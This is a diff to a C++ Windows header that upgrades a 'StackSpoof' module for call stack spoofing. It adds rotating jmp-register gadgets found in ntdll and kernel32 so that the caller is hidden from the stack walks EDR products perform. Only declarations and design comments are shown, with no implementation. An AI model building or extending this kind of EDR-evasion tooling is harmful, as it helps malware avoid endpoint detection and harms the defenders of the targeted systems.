@@ -12,32 +12,47 @@
 #include <windows.h>
 
 // ═══════════════════════════════════════════════════════════════
-//  CALL STACK SPOOFING v1 — Simple Frame Spoof
+//  CALL STACK SPOOFING v2 — Rotating Multi-Register Spoof
 //
-//  Finds FF E3 (jmp rbx) and FF E6 (jmp rsi) gadgets in ntdll,
-//  kernel32, kernelbase. These are FAR more common than 0F 05 C3
-//  (50+ in ntdll alone), making this highly reliable.
+//  Scans trusted modules for jmp-reg gadgets and rotates through
+//  them to avoid address fingerprinting by EDR stack walkers.
 //
-//  SpoofCall4 replaces our module's return address on the stack
-//  with the jmp gadget address from a trusted module. When the
-//  called function returns, RtlWalkFrameChain sees:
-//    target_function ← jmp_gadget_in_ntdll ← ...
-//  Our module does not appear in the chain.
+//  Non-volatile register gadgets (SpoofCall-capable):
+//    FF E3 = jmp rbx (type 0)  — original, most common
+//    FF E6 = jmp rsi (type 1)  — second most common
+//    FF E5 = jmp rbp (type 5)  — available in some modules
+//    FF E7 = jmp rdi (type 6)  — available in some modules
+//
+//  Volatile register gadgets (pool diversity only):
+//    FF E0 = jmp rax (type 2)  — not usable for SpoofCall (rax=retval)
+//    FF E1 = jmp rcx (type 3)  — not usable (rcx=arg1, volatile)
+//    FF E2 = jmp rdx (type 4)  — not usable (rdx=arg2, volatile)
+//
+//  SpoofCall4 rotates through non-volatile types. Each call may
+//  use a different gadget address, making fingerprinting harder.
 //
 //  Note: For syscalls, Tier 1 indirect trampolines already provide
 //  call stack spoofing (return addr in ntdll). SpoofCall is for
 //  WinAPI calls or when indirect syscalls are unavailable.
-//
-//  Limitation: SpoofCall4 does NOT preserve rbx. The C++ wrapper
-//  must not depend on rbx across the call.
 // ═══════════════════════════════════════════════════════════════
 
 namespace StackSpoof
 {
+    // Gadget type constants
+    enum GadgetType : unsigned char {
+        GADGET_JMP_RBX = 0,    // FF E3 — non-volatile, SpoofCall-capable
+        GADGET_JMP_RSI = 1,    // FF E6 — non-volatile, SpoofCall-capable
+        GADGET_JMP_RAX = 2,    // FF E0 — volatile, pool only
+        GADGET_JMP_RCX = 3,    // FF E1 — volatile, pool only
+        GADGET_JMP_RDX = 4,    // FF E2 — volatile, pool only
+        GADGET_JMP_RBP = 5,    // FF E5 — non-volatile, SpoofCall-capable
+        GADGET_JMP_RDI = 6,    // FF E7 — non-volatile, SpoofCall-capable
+    };
+
     // Spoof gadget found in trusted modules
     struct SpoofGadget {
-        void* address;    // Address of FF E3 / FF E6 in trusted module
-        unsigned char type;  // 0 = FF E3 (jmp rbx), 1 = FF E6 (jmp rsi)
+        void* address;         // Address of FF Exx in trusted module
+        unsigned char type;    // GadgetType enum value
     };
 
     // Initialize — scan for spoof gadgets in trusted modules
@@ -45,10 +60,14 @@ namespace StackSpoof
     bool Init();
 
     // SpoofCall4 — call a 4-arg function with spoofed return address
-    // Uses MASM SpoofCallWrapper internally
+    // Rotates gadget type/address across calls for anti-fingerprinting
     void* SpoofCall4(void* funcPtr, void* arg1, void* arg2, void* arg3, void* arg4);
 
-    // Get a random spoof gadget (FF E3 preferred for SpoofCall4)
+    // Get a spoof gadget suitable for SpoofCall (non-volatile types only)
+    // Rotates through gadgets to avoid address fingerprinting
+    SpoofGadget* GetSpoofGadgetForSpoofCall();
+
+    // Get a random spoof gadget (any type, for pool diversity queries)
     SpoofGadget* GetSpoofGadget();
 
     // Get count of available spoof gadgets
@@ -59,6 +78,5 @@ namespace StackSpoof
     DWORD GetPoolDataSize();
 
     // Get address of a C3 (ret) instruction in ntdll
-    // Useful as a fake "called from" address in synthetic frames
     void* GetRetGadget();
 }
